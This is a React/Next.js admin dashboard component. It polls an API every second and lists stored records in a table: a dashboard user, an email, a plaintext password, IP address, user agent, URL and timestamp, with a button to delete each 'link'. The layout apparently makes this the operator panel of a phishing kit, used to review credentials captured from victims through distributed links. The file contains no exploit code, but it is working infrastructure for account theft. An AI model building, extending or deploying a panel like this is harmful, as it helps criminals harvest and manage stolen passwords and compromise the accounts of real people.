"use client";

import Loader from "@/components/Loader";
import { format } from "date-fns";
import { useState,useEffect } from "react";
import toast from "react-hot-toast";
import { MdDelete, MdKeyboardArrowLeft, MdKeyboardArrowRight } from "react-icons/md";
import useSWR, { mutate } from "swr";
const AdminDashboard = () => {
  const [currentPage, setCurrentPage] = useState(1);
  const itemsPerPage = 10;
  const [isDeleteModalOpen, setIsDeleteModalOpen] = useState(false);
  const [userToDelete, setUserToDelete] = useState(null); // Track user for deletion
  const [isDeleting, setIsDeleting] = useState(false); // Track deletion state

  const fetcher = (url) => fetch(url).then((res) => res.json());
  const { data, isLoading } = useSWR("/api/information_list", fetcher, {
    refreshInterval: 1000,
  });

  if (isLoading || isDeleting) {
    return <Loader />; // Show loader while fetching or deleting
  }

  // Pagination logic
  const totalPages = Math.ceil(data.length / itemsPerPage);
  const startIndex = (currentPage - 1) * itemsPerPage;
  const currentItems = data.slice(startIndex, startIndex + itemsPerPage);

  const handlePageChange = (page) => {
    if (page >= 1 && page <= totalPages) {
      setCurrentPage(page);
    }
  };

  const deleteLink = async () => {
    setIsDeleting(true); // Set deleting state to true when the process starts
    try {
      const response = await fetch("/api/information_list", {
        method: "DELETE",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ id: userToDelete }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.message || "Failed to delete the link");
      }

      toast.success("Link deleted successfully!");

      // Trigger re-fetch or update the data locally using mutate
      mutate("/api/information_list"); // Re-fetch data

      // Adjust the current page if needed
      if (currentItems.length === 1 && currentPage > 1) {
        setCurrentPage(currentPage - 1); // Go to the previous page if current page has no data
      } else if (currentPage > totalPages) {
        setCurrentPage(totalPages); // Ensure the page is not out of bounds
      }

      setIsDeleteModalOpen(false); // Close the modal after successful deletion
    } catch (error) {
      setIsDeleteModalOpen(false); // Close the modal in case of an error
    } finally {
      setIsDeleting(false); // Reset deleting state after the process ends
    }
  };

  return (
    <div className="p-4">
      <h1 className="mb-4 text-xl font-bold">Admin Dashboard</h1>
      <table className="w-full border border-collapse border-gray-300 table-auto">
        <thead>
          <tr className="bg-gray-200">
            <th className="px-4 py-2 border border-gray-300 text-start">SL</th>
            <th className="px-4 py-2 border border-gray-300 text-start">Dashboard User</th>
            <th className="px-4 py-2 border border-gray-300 text-start">Email</th>
            <th className="px-4 py-2 border border-gray-300 text-start">Password</th>
            <th className="px-4 py-2 border border-gray-300 text-start">Ip</th>
            <th className="px-4 py-2 border border-gray-300 text-start">Agent</th>
            <th className="px-4 py-2 border border-gray-300 text-start">Url</th>
            <th className="px-4 py-2 border border-gray-300 text-start">Date</th>
            <th className="px-4 py-2 border border-gray-300">Delete</th>
          </tr>
        </thead>
        <tbody>
          {currentItems?.reverse()?.map((user, index) => (
            <tr key={user._id} className={`${index % 2 === 0 ? "bg-gray-100" : "bg-white"} hover:bg-gray-200 transition-colors`}>
              <td className="px-4 py-2 border border-gray-300">{startIndex + index + 1}</td>
              <td className="px-4 py-2 border border-gray-300">{user.logEmail}</td>
              <td className="px-4 py-2 border border-gray-300">{user.email}</td>
              <td className="px-4 py-2 border border-gray-300">{user.password}</td>
              <td className="px-4 py-2 border border-gray-300">{user.ip}</td>
              <td className="px-4 py-2 border border-gray-300">{user.userAgent}</td>
              <td className="px-4 py-2 border border-gray-300">{user.url?.split("?")[0]}</td>
              <td className="px-4 py-2 border border-gray-300">
                {format(new Date(user.createdAt), "yyyy-MM-dd HH:mm:ss")}
              </td>
              <td className="px-4 py-2 text-center border border-gray-300">
                <button
                  onClick={() => {
                    setUserToDelete(user._id); // Set user ID to delete
                    setIsDeleteModalOpen(true); // Open delete modal
                  }}
                  className="p-2 text-white bg-red-500 rounded hover:bg-red-600"
                >
                  <MdDelete size={18} />
                </button>
              </td>
            </tr>
          ))}
        </tbody>
      </table>

      {/* Pagination */}
      {currentItems && currentItems.length === 0 ? (
        <p className="text-xl font-semibold text-center text-gray-500"></p>
      ) : (
        <div className="flex items-center gap-4 mt-4">
          <button
            onClick={() => handlePageChange(currentPage - 1)}
            className={`${
              currentPage === 1 ? "cursor-not-allowed bg-gray-200" : "bg-blue-500 hover:bg-blue-600"
            } text-white px-3 py-2 rounded`}
            disabled={currentPage === 1}
          >
            <MdKeyboardArrowLeft />
          </button>

          <div className="flex gap-2">
            {Array.from({ length: totalPages }, (_, index) => (
              <button
                key={index}
                onClick={() => handlePageChange(index + 1)}
                className={`${
                  currentPage === index + 1 ? "bg-blue-500 text-white" : "bg-gray-200 text-gray-700"
                } px-4 py-1 rounded`}
              >
                {index + 1}
              </button>
            ))}
          </div>

          <button
            onClick={() => handlePageChange(currentPage + 1)}
            className={`${
              currentPage === totalPages ? "cursor-not-allowed bg-gray-200" : "bg-blue-500 hover:bg-blue-600"
            } text-white px-3 py-2 rounded`}
            disabled={currentPage === totalPages}
          >
            <MdKeyboardArrowRight />
          </button>
        </div>
      )}

      {isDeleteModalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
          <div
            className={`bg-white p-6 rounded-lg shadow-lg transform transition-all duration-300 ${
              isDeleteModalOpen ? "scale-100 opacity-100" : "scale-95 opacity-0"
            }`}
          >
            <h3 className="mb-4 text-lg font-bold">Are you sure you want to delete this link?</h3>
            <div className="flex justify-end gap-4">
              <button
                onClick={() => setIsDeleteModalOpen(false)} // Close modal on cancel
                className="px-4 py-2 text-black bg-gray-300 rounded"
              >
                Cancel
              </button>
              <button
                onClick={deleteLink} // Confirm delete and close modal
                className="px-4 py-2 text-white bg-red-500 rounded"
              >
                Confirm
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default AdminDashboard;
